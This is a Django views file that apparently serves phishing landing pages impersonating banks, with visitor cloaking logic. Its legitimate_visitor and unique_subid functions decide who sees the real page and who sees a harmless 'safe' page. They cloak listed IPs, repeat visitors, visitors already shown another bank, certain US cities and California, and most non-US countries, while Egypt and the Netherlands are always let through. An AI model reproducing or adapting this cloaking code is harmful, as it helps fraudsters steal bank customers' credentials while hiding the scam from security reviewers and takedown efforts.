import datetime
import urllib2
import string, random

from django.shortcuts import render_to_response, HttpResponse, HttpResponseRedirect, get_object_or_404
from django.core.urlresolvers import reverse
from django.conf import settings
from pygeoip import GeoIP, GeoIPError

from website.models import Keyword, LandingPage, Visitor

geoip = GeoIP(settings.GEOIP_DB_PATH)


def generate_subid():
    sequence = list(string.ascii_letters + string.digits)

    while True:
        random.shuffle(sequence)
        subid = ''.join(sequence[:15])

        if not Visitor.objects.filter(text=subid).exists():
            return subid


def landing_page(request, keyword, lp='lp5'):
    subid = generate_subid()
    visitor = save_visitor(request, keyword, lp)
    visitor.text = subid
    visitor.save()

    return HttpResponseRedirect(reverse('website.newviews.unique_subid', args=[subid,]))

def unique_subid(request, subid):

    visitor = get_object_or_404(Visitor, text=subid)

    ip = request.META.get('HTTP_X_REAL_IP', '')
    day_ago = datetime.datetime.now()-datetime.timedelta(days=1)

    context = {
        'v': visitor,
        'logo': visitor.keyword.image.url,
        'bank': visitor.keyword,
    }

    if visitor.visit_datetime > day_ago:
        # One more visit, just showing safe page
        return render_to_response('%s/safe.html' % visitor.lp, context)

    else:
        # First hit in a day
        if visitor.country_code in ('EG', 'NL'):  # Allow Egypt and Netherlands always
            visitor.cloaked = False
            visitor.reason = ''
        visitor.visit_datetime = datetime.datetime.now()  # Saving last access time

    visitor.ip = ip
    visitor.save()

    if visitor.cloaked:
        return render_to_response('%s/safe.html' % visitor.lp, context)

    return render_to_response('%s/index.html' % visitor.lp, context)


def ip_details(request):
    ip =  request.META.get('HTTP_X_REAL_IP', '')
    ip = request.META['REMOTE_ADDR']
    ip = '93.174.93.224'
    geo_data = geoip.record_by_addr(ip)
    print(geo_data)
    return HttpResponse(geo_data.items())

def is_server(ip):
    try:
        urllib2.urlopen('http://%s' % ip, timeout=0.5)
    except urllib2.URLError:
        return False
    return True


bad_ips = [#'208.43.90.178',
           '50.28.69.79',
           '67.227.83.121',
           ]

#USE ONLY LOWERCASE
cities = ['dallas',
          'irvine',
          'los angeles']
states = ['ca']
allowed_country = ['us', 'ua']

def legitimate_visitor(ip, geo_data, v):
#    if is_server(ip):
#        return 'server'
    if ip in bad_ips:
        return 'ip'
    #    if 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.79 Safari/537.1' in v.ua:
    #        return 'user agent'
    dt = datetime.datetime.now() - datetime.timedelta(days=1)
    dt5 = datetime.datetime.now() - datetime.timedelta(days=5)
    number_of_visits = Visitor.objects.filter(ip=ip, visit_datetime__gte=dt5).exists()
    another_bank = Visitor.objects.filter(ip=ip, visit_datetime__gte=dt5).exclude(keyword=v.keyword_id).exists()
    #    print(visits)

    if number_of_visits:
        return 'visted already'
    #        return 'visted %s times' % number_of_visits
    if another_bank:
        return 'another bank'
    if geo_data.get('city','').lower() in cities:
        return 'city'
    if geo_data.get('region_name','').lower() in states:
        return 'region_name'
    if not geo_data.get('country_code','').lower() in allowed_country:
        return 'country_code'
    return ''


def save_visitor(request, keyword_text, lp):
    v = Visitor()
    v.visit_datetime = datetime.datetime.now()
    v.ip = request.META.get('HTTP_X_REAL_IP', '')
    v.ua = request.META['HTTP_USER_AGENT'][:100]
    keyword = get_object_or_404(Keyword, keyword=keyword_text)
    v.keyword = keyword
    v.lp = lp
    v.dt = datetime.datetime.now()
    try:
        geo_data = geoip.record_by_addr(str(v.ip))
    except GeoIPError:
        geo_data = geoip.record_by_addr('71.227.57.247')
    if geo_data is None:
        geo_data = {}
    v.city = geo_data.get('city','').lower()
    v.state = geo_data.get('region_name','')
    v.country_code = geo_data.get('country_code','')
    v.zip_code = geo_data.get('postal_code','')
    print(legitimate_visitor(v.ip, geo_data, v))
    v.reason = legitimate_visitor(v.ip, geo_data, v)
    if v.reason: #Reason to cloak
        v.cloaked = True
    else:
        v.cloaked = False #no need to cloak
        print('Cloaking needed')
    v.save()
    return v
